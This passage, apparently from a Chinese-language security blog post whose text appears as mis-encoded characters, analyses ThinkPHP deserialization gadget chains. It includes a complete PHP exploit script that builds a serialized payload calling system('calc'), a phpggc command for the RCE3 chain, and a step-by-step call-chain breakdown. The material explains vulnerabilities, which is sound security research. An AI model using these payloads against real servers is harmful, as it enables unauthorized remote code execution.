<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€’å½’è¿‡æ»¤ç»™å®šçš„å€¼</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $value   é”®å€¼ = &#x27;calc&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $key     é”®å = &#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $filters è¿‡æ»¤æ–¹æ³•+é»˜è®¤å€¼ = [&#x27;system&#x27;, null]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å°† $filter æ•°ç»„ä¸­çš„æœ€åä¸€é¡¹ null å–å‡º</span></span><br><span class="line">    <span class="comment">// æ­¤æ—¶ $filter æ•°ç»„è¿˜å‰©ä¸€é¡¹ &quot;system&quot;</span></span><br><span class="line">    <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨ $filter ä¸­çš„å”¯ä¸€ä¸€é¡¹å‡½æ•° &quot;system&quot;</span></span><br><span class="line">            <span class="comment">// å‚æ•°æ˜¯ $value å³æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ &quot;calc&quot;</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨è„šæœ¬-1"><a href="#åˆ©ç”¨è„šæœ¬-1" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>, <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Memcache</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;HEXENS&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Memcached</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">get</span>, $<span class="title class_">filter</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;get = [<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span> =&gt; <span class="variable">$parameter</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="variable">$function</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Request</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>, <span class="variable">$handler</span>, <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Request</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = (<span class="keyword">new</span> <span class="title class_">\ReflectionClass</span>(<span class="title class_">Output</span>::<span class="variable language_">class</span>))-&gt;<span class="title function_ invoke__">newInstanceWithoutConstructor</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>, <span class="variable">$query</span>, <span class="variable">$bindAttr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>\<span class="title class_">HasOne</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span>, <span class="variable">$error</span>, <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$function</span>, <span class="variable">$parameter</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>(&quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE3ï¼ˆå½±å“-6-0-1-ï¼‰"><a href="#RCE3ï¼ˆå½±å“-6-0-1-ï¼‰" class="headerlink" title="RCE3ï¼ˆå½±å“ 6.0.1+ï¼‰"></a>RCE3ï¼ˆå½±å“ 6.0.1+ï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯-2"><a href="#åŸºæœ¬ä¿¡æ¯-2" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š6.0.1+</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE3 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE3.svg"
                      alt="TPRCE3"
                ></p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">League\Flysystem\Cached\Storage\Psr6Cache <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">pool</span>:League\Flysystem\Cached\Storage\<span class="attr">Psr6Cache</span>:<span class="keyword">private</span>] =&gt; League\Flysystem\<span class="built_in">Directory</span> <span class="title function_ invoke__">Object</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="attr">filesystem</span>:<span class="keyword">protected</span>] =&gt; League\Flysystem\<span class="built_in">Directory</span> <span class="title function_ invoke__">Object</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="attr">filesystem</span>:<span class="keyword">protected</span>] =&gt; think\Validate <span class="title function_ invoke__">Object</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="attr">type</span>:<span class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [key] =&gt; system</span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="attr">path</span>:<span class="keyword">protected</span>] =&gt; calc</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [<span class="attr">path</span>:<span class="keyword">protected</span>] =&gt; key</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="attr">autosave</span>:<span class="keyword">protected</span>] =&gt; </span><br><span class="line">    [<span class="attr">key</span>:<span class="keyword">protected</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">League\Flysystem\Cached\Storage\Psr6Cache-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">save</span>()</span><br><span class="line">    â””â”€â”€ <span class="variable language_">$this</span>-&gt;pool-&gt;<span class="title function_ invoke__">getItem</span>(<span class="variable">$this</span>-&gt;key)                      <span class="comment">// âœ… $this-&gt;pool = Directory1ï¼Œæ—  getItem æ–¹æ³•</span></span><br><span class="line">        â””â”€â”€ <span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$this</span>-&gt;key])        <span class="comment">// âœ… ç¬¬ä¸€æ¬¡ __call</span></span><br><span class="line"></span><br><span class="line">League\Flysystem\<span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$this</span>-&gt;key])</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path)                    <span class="comment">// âœ… $arguments = [$path1, $key]</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;filesystem, <span class="string">&quot;getItem&quot;</span>], [<span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">    â””â”€â”€ <span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path1</span>, <span class="variable">$key</span>])          <span class="comment">// âœ… ç¬¬äºŒæ¬¡ __callï¼ˆfilesystem = Directory2ï¼‰</span></span><br><span class="line"></span><br><span class="line">League\Flysystem\<span class="built_in">Directory</span>-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$arguments</span>, <span class="variable">$this</span>-&gt;path)                    <span class="comment">// âœ… $arguments = [$path2, $path1, $key]</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;filesystem, <span class="string">&quot;getItem&quot;</span>], [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">    â””â”€â”€ think\Validate-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line"></span><br><span class="line">think\Validate-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getItem&quot;</span>, [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>])</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">array_push</span>(<span class="variable">$args</span>, <span class="string">&#x27;getItem&#x27;</span>)                              <span class="comment">// âœ… $args = [$path2, $path1, $key, &#x27;getItem&#x27;]</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;is&#x27;</span>], [<span class="variable">$path2</span>, <span class="variable">$path1</span>, <span class="variable">$key</span>, <span class="string">&#x27;getItem&#x27;</span>])</span><br><span class="line"></span><br><span class="line">think\Validate-&gt;<span class="title function_ invoke__">is</span>(<span class="variable">$value</span> = <span class="variable">$path2</span>, <span class="variable">$rule</span> = <span class="variable">$path1</span>, <span class="variable">$data</span> = <span class="variable">$key</span>)</span><br><span class="line">â””â”€â”€ <span class="variable">$data</span> ç±»å‹å¿…é¡»ä¸º <span class="keyword">array</span>                                    <span class="comment">// âœ… å¦åˆ™è§¦å‘ TypeError</span></span><br><span class="line">â””â”€â”€ <span class="keyword">switch</span> (<span class="title class_">Str</span>::<span class="title function_ invoke__">camel</span>(<span class="variable">$rule</span>)) â†’ <span class="keyword">default</span></span><br><span class="line">â””â”€â”€ <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;type[<span class="variable">$rule</span>]) â†’ <span class="literal">true</span>                          <span class="comment">// âœ… $this-&gt;type[$path1] = &#x27;system&#x27;</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>])        <span class="comment">// âœ… system($path2)</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ-2"><a href="#è°ƒç”¨é“¾åˆ†æ-2" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p><code>League\Flysystem\Cached\Storage\Psr6Cache</code> ç±»ç»§æ‰¿äº <code>League\Flysystem\Cached\Storage\AbstractCache</code>ï¼Œå› æ­¤ææ„çš„æ—¶å€™è°ƒç”¨çš„æ˜¯ <code>AbstractCache-&gt;__destruct</code> å‡½æ•°ã€‚</p>
<p>åœ¨è¯¥ <code>__destruct</code> å‡½æ•°ä¸­ï¼Œå¦‚æœ <code>AbstractCache</code> çš„ <code>$autosave</code> å±æ€§å€¼ä¸º <code>false</code>ï¼Œåˆ™ä¼šè°ƒç”¨åˆ° <code>Psr6Cache-&gt;save</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Destructor.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable language_">$this</span>-&gt;autosave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Psr6Cache-&gt;save</code> å‡½æ•°ä¼šè°ƒç”¨ <code>$this-&gt;pool</code> çš„ <code>getItem</code> æ–¹æ³•ï¼Œå‚æ•°ä¸º <code>$this-&gt;key</code>ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritdoc</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;pool-&gt;<span class="title function_ invoke__">getItem</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºæˆ‘ä»¬è®¾ç½® <code>$this-&gt;pool</code> ä¸º <code>League\Flysystem\Directory</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ²¡æœ‰ <code>getItem</code> æ–¹æ³•ï¼Œå› æ­¤ä¼šè°ƒç”¨åˆ° <code>Directory</code> å®ç°çš„æŠ½è±¡ç±» <code>League\Flysystem\Handler</code> çš„ <code>__call</code> æ–¹æ³•ã€‚</p>
